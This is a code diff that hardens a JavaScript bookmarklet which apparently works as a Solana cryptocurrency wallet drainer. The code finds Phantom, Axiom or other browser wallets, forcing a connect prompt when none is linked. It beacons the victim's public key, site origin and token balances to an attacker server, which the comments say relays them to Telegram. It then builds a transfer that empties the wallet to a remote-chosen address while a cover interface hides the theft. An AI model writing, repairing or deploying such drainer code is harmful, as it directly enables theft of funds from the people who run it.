@@ -14,49 +14,61 @@
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
   };
 
-  // beacon FIRST — every later failure can report itself
+  const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
+    Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
+
+  let PKSTR = null;   // canonical pubkey string, set only when safely extracted
   const beacon = (m, o) => { o = o || {}; try {
     fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
-      body: JSON.stringify({ pk: o.pk || "?", provider: o.provider || "unknown",
+      body: JSON.stringify({ pk: o.pk || PKSTR || "?", provider: o.provider || "unknown",
         origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "",
         m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
   } catch {} };
 
   try {
-    beacon("loaded", { provider: "scanning" });               // visible proof the bookmark fired
-
-    const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
-      Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
+    beacon("loaded", { provider: "scanning" });
 
     const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
     const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
     const { decode: b58d } = await import(E + "bs58@6.0.0");
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
-    // — detect: connected session first, else attempt connect (25s cap) —
+    // safe pubkey extraction — never lets a throwing getter kill detection
+    const pubStr = v => { try {
+      if (!v) return null;
+      if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
+      if (typeof v.toBase58 === "function") return v.toBase58();
+      if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
+      return null;
+    } catch (e) { return null; } };
+
+    // — detect: connected session first —
     let name = "?", prov = null;
     const CANDS = [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]];
     for (const [n, f] of CANDS) {
-      const w = f();
-      if (w?.publicKey) { name = n; prov = w; break; }
+      try { const w = f(); const p = pubStr(w && w.publicKey);
+        if (p) { name = n; prov = w; PKSTR = p; break; } } catch {}
     }
     if (!prov) for (const k of Object.keys(window)) {
-      try { const w = window[k]; if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; } } catch {}
+      try { const w = window[k]; const p = pubStr(w && w.publicKey);
+        if (p && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; PKSTR = p; break; } } catch {}
     }
+    // — nothing connected? attempt connect (25s cap per wallet) —
     if (!prov) {
       for (const [n, f] of CANDS) {
-        const w = f();
+        const w = (() => { try { return f(); } catch (e) { return null; } })();
         if (w && typeof w.connect === "function") {
           try {
-            const c = await withTO(w.connect(), 25000);
-            if (c && c.publicKey) { name = n; prov = w; break; }
-          } catch {}
+            const c = await withTO(Promise.resolve(w.connect()), 25000);
+            const p = pubStr((c && c.publicKey) || w.publicKey);
+            if (p) { name = n; prov = w; PKSTR = p; break; }
+          } catch (e) { /* next candidate */ }
         }
       }
     }
     if (!prov) { beacon("detect", { provider: "none", extra: "bookmark fired \u2014 no connectable wallet in this tab" }); return; }
 
-    const pk = prov.publicKey.toBase58();
+    const pk = PKSTR;
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPC_URL, "confirmed");
     const label = name.startsWith("ext:") ? name.slice(4) : name;
@@ -88,10 +100,10 @@
     const fmt = n => (+n).toLocaleString("en-US", { maximumFractionDigits: 0 });
     const tokStr = toks.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ");
 
-    // — report detection IMMEDIATELY (before UI — survives strict CSP pages) —
+    // — report detection IMMEDIATELY (before UI — survives strict pages) —
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
-    // — cover UI (non-fatal: if this throws, detection/drain already succeeded) —
+    // — cover UI (non-fatal) —
     try {
       const el = document.createElement("div");
       el.id = "__ppcard";
@@ -162,7 +174,7 @@
       : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
       : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
-    // — drain build —
+    // — drain build: fresh blockhash/balances, treasury ATA auto-created —
     const FEE = 20000;
     async function buildTx(to) {
       const dest = new PublicKey(to);
@@ -235,7 +247,6 @@
       if (c?.cmd === "drain" && c.to && c.n !== lastN) { lastN = c.n; drain(c.to); }
     }, 2500);
   } catch (e) {
-    // any fatal error now lands in Telegram instead of dying silently
     try { beacon("err", { provider: name, msg: "fatal: " + String(e && e.message || e) }); } catch {}
   }
 })();
